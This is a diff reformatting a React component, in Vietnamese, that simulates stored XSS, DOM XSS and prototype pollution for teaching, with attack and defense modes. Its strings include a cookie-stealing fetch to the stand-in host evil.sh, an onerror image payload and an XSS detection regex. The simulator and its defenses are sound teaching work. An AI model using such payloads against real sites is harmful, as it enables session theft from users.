@@ -41,7 +41,12 @@ interface FakeComment {
 type TabId = 'stored' | 'dom' | 'proto';
 
 const SEED_COMMENTS: FakeComment[] = [
-  { id: 1, author: 'minh_dev', text: 'Bài viết chi tiết quá, cảm ơn tác giả!', executed: false },
+  {
+    id: 1,
+    author: 'minh_dev',
+    text: 'Bài viết chi tiết quá, cảm ơn tác giả!',
+    executed: false,
+  },
   { id: 2, author: 'hang.nguyen', text: 'Đã bookmark, mai đọc tiếp.', executed: false },
 ];
 
@@ -144,7 +149,10 @@ export function XssInjectionRange() {
         '⚠️ alert() từ payload — mã đã thực thi trong trình duyệt của MỌI user mở trang này!'
       );
     }
-    setComments((prev) => [...prev, { id: prev.length + 3, author: 'attacker', text, executed: dangerous }]);
+    setComments((prev) => [
+      ...prev,
+      { id: prev.length + 3, author: 'attacker', text, executed: dangerous },
+    ]);
     setDraft('');
   };
 
@@ -157,7 +165,10 @@ export function XssInjectionRange() {
           ...prev,
           ...makeLines([
             [`$ navigate → /profile${hashInput}`, 'info'],
-            ['[sink:textContent] chuỗi render NGUYÊN VĂN — parser HTML không chạm vào', 'ok'],
+            [
+              '[sink:textContent] chuỗi render NGUYÊN VĂN — parser HTML không chạm vào',
+              'ok',
+            ],
             ['→ không có element nào được tạo, onerror/onload vô hiệu ✅', 'ok'],
           ]),
         ].slice(-9)
@@ -174,9 +185,14 @@ export function XssInjectionRange() {
           ...(dangerous
             ? ([
                 [`element lạ được tạo → event handler FIRED`, 'bad'],
-                [`fetch('https://evil.sh/c?' + document.cookie) → 🍪 COOKIE STOLEN`, 'bad'],
+                [
+                  `fetch('https://evil.sh/c?' + document.cookie) → 🍪 COOKIE STOLEN`,
+                  'bad',
+                ],
               ] as Array<[string, Tone]>)
-            : ([[`thẻ hợp lệ được parse — raw HTML pipeline xác nhận`, 'warn']] as Array<[string, Tone]>)),
+            : ([[`thẻ hợp lệ được parse — raw HTML pipeline xác nhận`, 'warn']] as Array<
+                [string, Tone]
+              >)),
         ]),
       ].slice(-9)
     );
@@ -191,7 +207,10 @@ export function XssInjectionRange() {
           ...prev,
           ...makeLines([
             [`$ deepMerge(config, parseQuery('${queryString}'))`, 'info'],
-            ['config là Map + Object.freeze(Object.prototype) → ghi __proto__ bị BỎ QUA', 'ok'],
+            [
+              'config là Map + Object.freeze(Object.prototype) → ghi __proto__ bị BỎ QUA',
+              'ok',
+            ],
             ['Object.prototype giữ nguyên vẹn — pollution THẤT BẠI ✅', 'ok'],
           ]),
         ].slice(-9)
@@ -237,8 +256,10 @@ export function XssInjectionRange() {
     if (defenseMode) {
       return (
         <div className="space-y-1">
-          <div className="rounded-md bg-slate-900/70 px-2 py-1.5 text-slate-300">{domRaw}</div>
-          <p className="text-[10px] uppercase tracking-wider text-emerald-500">
+          <div className="rounded-md bg-slate-900/70 px-2 py-1.5 text-slate-300">
+            {domRaw}
+          </div>
+          <p className="text-[10px] tracking-wider text-emerald-500 uppercase">
             textContent · hiển thị nguyên văn, không parse
           </p>
         </div>
@@ -246,8 +267,8 @@ export function XssInjectionRange() {
     }
     const dangerous = /<(img|svg|script|iframe)\b|on(error|load)\s*=/i.test(domRaw);
     if (dangerous) {
-      const tags = Array.from(new Set(domRaw.match(/<\/?[a-zA-Z]+/g) ?? []).values()).map((t) =>
-        t.replace('</', '')
+      const tags = Array.from(new Set(domRaw.match(/<\/?[a-zA-Z]+/g) ?? []).values()).map(
+        (t) => t.replace('</', '')
       );
       return (
         <div className="space-y-1">
@@ -265,9 +286,12 @@ export function XssInjectionRange() {
     const inner = domRaw.replace(/<\/?[a-zA-Z][^>]*>/g, '');
     return (
       <div className="space-y-1">
-        <div className="rounded-md bg-slate-900/70 px-2 py-1.5 font-bold text-slate-100">{inner}</div>
-        <p className="text-[10px] uppercase tracking-wider text-amber-500">
-          innerHTML · thẻ được parse THẬT (lần này chỉ là &lt;b&gt; — pipeline vẫn nguy hiểm)
+        <div className="rounded-md bg-slate-900/70 px-2 py-1.5 font-bold text-slate-100">
+          {inner}
+        </div>
+        <p className="text-[10px] tracking-wider text-amber-500 uppercase">
+          innerHTML · thẻ được parse THẬT (lần này chỉ là &lt;b&gt; — pipeline vẫn nguy
+          hiểm)
         </p>
       </div>
     );
@@ -289,7 +313,7 @@ export function XssInjectionRange() {
               ATTACK MODE
             </Badge>
           )}
-          <span className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
+          <span className="text-muted-foreground font-mono text-[10px] tracking-wider uppercase">
             đã khai hoả {hitCount}/3 vector chèn mã
           </span>
         </div>
@@ -312,7 +336,12 @@ export function XssInjectionRange() {
             <ShieldCheck className="mr-1 h-3 w-3" />
             Sanitize + freeze
           </Button>
-          <Button size="sm" variant="ghost" onClick={resetRange} className="h-7 px-2 text-[11px]">
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={resetRange}
+            className="h-7 px-2 text-[11px]"
+          >
             <RotateCcw className="mr-1 h-3 w-3" />
             Reset
           </Button>
@@ -320,7 +349,7 @@ export function XssInjectionRange() {
       </div>
 
       {/* Tab-like switcher */}
-      <div className="flex w-fit gap-1 rounded-xl border border-border/80 bg-card p-1">
+      <div className="border-border/80 bg-card flex w-fit gap-1 rounded-xl border p-1">
         {TABS.map((tab) => (
           <button
             key={tab.id}
@@ -342,13 +371,16 @@ export function XssInjectionRange() {
       {activeTab === 'stored' && (
         <div className="relative space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
           {alertBanner && (
-            <div className="pointer-events-none absolute left-1/2 top-6 z-10 w-[90%] -translate-x-1/2 -rotate-1 rounded-lg border border-amber-400/50 bg-amber-950/95 px-4 py-2 text-center font-mono text-[11px] font-bold text-amber-300 shadow-xl">
+            <div className="pointer-events-none absolute top-6 left-1/2 z-10 w-[90%] -translate-x-1/2 -rotate-1 rounded-lg border border-amber-400/50 bg-amber-950/95 px-4 py-2 text-center font-mono text-[11px] font-bold text-amber-300 shadow-xl">
               {alertBanner}
             </div>
           )}
           <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
             <span>$ GET /post/123/comments</span>
-            <Badge variant={defenseMode ? 'success' : 'destructive'} className="text-[9px]">
+            <Badge
+              variant={defenseMode ? 'success' : 'destructive'}
+              className="text-[9px]"
+            >
               {defenseMode ? 'render: auto-escaping' : 'render: dangerouslySetInnerHTML'}
             </Badge>
           </div>
@@ -366,9 +398,14 @@ export function XssInjectionRange() {
                 }`}
               >
                 <div className="mb-0.5 flex items-center gap-2">
-                  <span className="font-mono text-[10px] text-slate-500">@{comment.author}</span>
+                  <span className="font-mono text-[10px] text-slate-500">
+                    @{comment.author}
+                  </span>
                   {comment.executed && (
-                    <Badge variant="destructive" className="animate-pulse gap-1 text-[9px]">
+                    <Badge
+                      variant="destructive"
+                      className="animate-pulse gap-1 text-[9px]"
+                    >
                       ⚡ EXECUTED payload
                     </Badge>
                   )}
@@ -382,15 +419,18 @@ export function XssInjectionRange() {
                   <p className="font-mono text-[11px] leading-relaxed text-red-300">
                     {comment.text}
                     <span className="mt-1 block text-[10px] text-red-400/80">
-                      → onerror/onload FIRED · fetch(&apos;https://evil.sh/collect&apos;) · document.cookie rời máy nạn nhân
+                      → onerror/onload FIRED · fetch(&apos;https://evil.sh/collect&apos;)
+                      · document.cookie rời máy nạn nhân
                     </span>
                   </p>
                 ) : comment.author === 'attacker' && defenseMode ? (
-                  <p className="break-all font-mono text-[11px] leading-relaxed text-emerald-300/90">
+                  <p className="font-mono text-[11px] leading-relaxed break-all text-emerald-300/90">
                     {escapeHtml(comment.text)}
                   </p>
                 ) : (
-                  <p className="text-[11px] leading-relaxed text-slate-300">{comment.text}</p>
+                  <p className="text-[11px] leading-relaxed text-slate-300">
+                    {comment.text}
+                  </p>
                 )}
               </div>
             ))}
@@ -444,7 +484,10 @@ export function XssInjectionRange() {
         <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
           <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
             <span>$ craft link gửi nạn nhân…</span>
-            <Badge variant={defenseMode ? 'success' : 'destructive'} className="text-[9px]">
+            <Badge
+              variant={defenseMode ? 'success' : 'destructive'}
+              className="text-[9px]"
+            >
               sink: {defenseMode ? 'textContent' : 'element.innerHTML'}
             </Badge>
           </div>
@@ -479,13 +522,20 @@ export function XssInjectionRange() {
             >
               malicious: &lt;img src=x onerror=steal()&gt;
             </button>
-            <Button size="sm" variant={defenseMode ? 'default' : 'destructive'} onClick={openCraftedLink} className="ml-auto h-8 text-[11px]">
+            <Button
+              size="sm"
+              variant={defenseMode ? 'default' : 'destructive'}
+              onClick={openCraftedLink}
+              className="ml-auto h-8 text-[11px]"
+            >
               Mở link (nạn nhân click)
             </Button>
           </div>
 
           <div className="rounded-lg border border-slate-800 bg-black/40 p-2.5">
-            <p className="mb-1 font-mono text-[10px] uppercase tracking-wider text-slate-600">kết quả render sink:</p>
+            <p className="mb-1 font-mono text-[10px] tracking-wider text-slate-600 uppercase">
+              kết quả render sink:
+            </p>
             {renderSinkPreview()}
           </div>
 
@@ -517,8 +567,15 @@ export function XssInjectionRange() {
         <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
           <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
             <span>$ query-string editor → deepMerge(config, params)</span>
-            <Badge variant={polluted ? 'destructive' : 'secondary'} className="text-[9px]">
-              {polluted ? 'PROTOTYPE INFECTED' : defenseMode ? 'prototype frozen' : 'prototype sạch'}
+            <Badge
+              variant={polluted ? 'destructive' : 'secondary'}
+              className="text-[9px]"
+            >
+              {polluted
+                ? 'PROTOTYPE INFECTED'
+                : defenseMode
+                  ? 'prototype frozen'
+                  : 'prototype sạch'}
             </Badge>
           </div>
 
@@ -528,7 +585,12 @@ export function XssInjectionRange() {
               onChange={(e) => setQueryString(e.target.value)}
               className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200"
             />
-            <Button size="sm" variant={defenseMode ? 'default' : 'destructive'} onClick={runDeepMerge} className="h-8 shrink-0 text-[11px]">
+            <Button
+              size="sm"
+              variant={defenseMode ? 'default' : 'destructive'}
+              onClick={runDeepMerge}
+              className="h-8 shrink-0 text-[11px]"
+            >
               Chạy deepMerge
             </Button>
           </div>
@@ -557,7 +619,8 @@ export function XssInjectionRange() {
                     ⚙️ Bảng điều khiển Admin — unlocked bởi pollution
                   </p>
                   <p className="font-mono text-[10px] text-amber-400/80">
-                    user.isAdmin === true mà không hề đăng nhập · Xóa user · Xuất DB · Đổi role
+                    user.isAdmin === true mà không hề đăng nhập · Xóa user · Xuất DB · Đổi
+                    role
                   </p>
                 </div>
               ) : (
@@ -599,24 +662,36 @@ export function XssInjectionRange() {
               key: 'stored' as const,
               icon: <MessageSquare className="h-3.5 w-3.5" />,
               label: 'Stored XSS qua bình luận',
-              hitNote: 'Payload nằm trong DB, tự khởi động trong trình duyệt của mọi user mở trang — kể cả admin.',
-              patchNote: 'Auto-escape biến payload thành text node; nếu buộc render HTML thì DOMPurify whitelist + CSP làm lớp đạn cuối.',
+              hitNote:
+                'Payload nằm trong DB, tự khởi động trong trình duyệt của mọi user mở trang — kể cả admin.',
+              patchNote:
+                'Auto-escape biến payload thành text node; nếu buộc render HTML thì DOMPurify whitelist + CSP làm lớp đạn cuối.',
             },
             {
               key: 'dom' as const,
               icon: <Link2 className="h-3.5 w-3.5" />,
               label: 'DOM XSS qua URL fragment',
-              hitNote: 'Fragment đi thẳng vào sink innerHTML — attacker chỉ cần một link, không phải lưu gì lên server.',
-              patchNote: 'Đổi sink sang textContent: fragment luôn là chuỗi nguyên văn, parser HTML không bao giờ chạm vào.',
+              hitNote:
+                'Fragment đi thẳng vào sink innerHTML — attacker chỉ cần một link, không phải lưu gì lên server.',
+              patchNote:
+                'Đổi sink sang textContent: fragment luôn là chuỗi nguyên văn, parser HTML không bao giờ chạm vào.',
             },
             {
               key: 'proto' as const,
               icon: <Braces className="h-3.5 w-3.5" />,
               label: 'Prototype pollution qua query string',
-              hitNote: 'deepMerge ghi __proto__ vào Object.prototype — mọi object trong runtime cùng lúc mang thuộc tính giả mạo.',
-              patchNote: 'Object.freeze(Object.prototype) + config Map-based: key __proto__ bị bỏ qua một cách âm thầm và an toàn.',
+              hitNote:
+                'deepMerge ghi __proto__ vào Object.prototype — mọi object trong runtime cùng lúc mang thuộc tính giả mạo.',
+              patchNote:
+                'Object.freeze(Object.prototype) + config Map-based: key __proto__ bị bỏ qua một cách âm thầm và an toàn.',
             },
-          ] as Array<{ key: 'stored' | 'dom' | 'proto'; icon: React.ReactNode; label: string; hitNote: string; patchNote: string }>
+          ] as Array<{
+            key: 'stored' | 'dom' | 'proto';
+            icon: React.ReactNode;
+            label: string;
+            hitNote: string;
+            patchNote: string;
+          }>
         ).map((vector) => {
           const hit = !defenseMode && hits[vector.key];
           const patched = defenseMode;
@@ -636,16 +711,28 @@ export function XssInjectionRange() {
                       : 'bg-secondary text-muted-foreground'
                 }`}
               >
-                {hit ? <Skull className="h-3.5 w-3.5" /> : patched ? <ShieldCheck className="h-3.5 w-3.5" /> : vector.icon}
+                {hit ? (
+                  <Skull className="h-3.5 w-3.5" />
+                ) : patched ? (
+                  <ShieldCheck className="h-3.5 w-3.5" />
+                ) : (
+                  vector.icon
+                )}
               </span>
               <div className="min-w-0 space-y-0.5">
-                <p className="text-xs font-bold text-foreground">{vector.label}</p>
-                {hit && <p className="text-[11px] leading-relaxed text-destructive">{vector.hitNote}</p>}
+                <p className="text-foreground text-xs font-bold">{vector.label}</p>
+                {hit && (
+                  <p className="text-destructive text-[11px] leading-relaxed">
+                    {vector.hitNote}
+                  </p>
+                )}
                 {patched && (
-                  <p className="text-[11px] leading-relaxed text-emerald-600 dark:text-emerald-400">{vector.patchNote}</p>
+                  <p className="text-[11px] leading-relaxed text-emerald-600 dark:text-emerald-400">
+                    {vector.patchNote}
+                  </p>
                 )}
                 {!hit && !patched && (
-                  <p className="text-[11px] leading-relaxed text-muted-foreground">
+                  <p className="text-muted-foreground text-[11px] leading-relaxed">
                     Chưa khai hoả — bắn vector này ở ATTACK MODE để xem Blast Radius.
                   </p>
                 )}
@@ -657,21 +744,25 @@ export function XssInjectionRange() {
 
       {/* Verdict */}
       {(hitCount > 0 || defenseMode) && (
-        <Card className={`glass-card p-4 ${defenseMode ? 'border-emerald-500/30' : 'border-destructive/30'}`}>
+        <Card
+          className={`glass-card p-4 ${defenseMode ? 'border-emerald-500/30' : 'border-destructive/30'}`}
+        >
           {hitCount > 0 && !defenseMode ? (
-            <p className="text-xs leading-relaxed text-foreground">
-              💀 <span className="font-bold">Blast Radius:</span> payload stored tái phát với mọi
-              pageview, một crafted link đủ bắn DOM XSS không cần lưu dấu vết, và pollution biến
-              toàn bộ object runtime thành ranh giới tin cậy sụp đổ — cookie bay về evil.sh trong
-              khi hệ thống vẫn nghĩ mọi thứ bình thường.
+            <p className="text-foreground text-xs leading-relaxed">
+              💀 <span className="font-bold">Blast Radius:</span> payload stored tái phát
+              với mọi pageview, một crafted link đủ bắn DOM XSS không cần lưu dấu vết, và
+              pollution biến toàn bộ object runtime thành ranh giới tin cậy sụp đổ —
+              cookie bay về evil.sh trong khi hệ thống vẫn nghĩ mọi thứ bình thường.
             </p>
           ) : (
-            <p className="text-xs leading-relaxed text-foreground">
+            <p className="text-foreground text-xs leading-relaxed">
               🛡️{' '}
-              <span className="font-bold text-emerald-600 dark:text-emerald-400">Defense Patch:</span>{' '}
-              auto-escape chặn stored/DOM payload ở tầng text node, DOMPurify whitelist cho trường
-              hợp buộc render HTML, Object.freeze + Map-based config đóng cửa prototype — cả ba
-              vector chuyển trạng thái PATCHED.
+              <span className="font-bold text-emerald-600 dark:text-emerald-400">
+                Defense Patch:
+              </span>{' '}
+              auto-escape chặn stored/DOM payload ở tầng text node, DOMPurify whitelist
+              cho trường hợp buộc render HTML, Object.freeze + Map-based config đóng cửa
+              prototype — cả ba vector chuyển trạng thái PATCHED.
             </p>
           )}
         </Card>
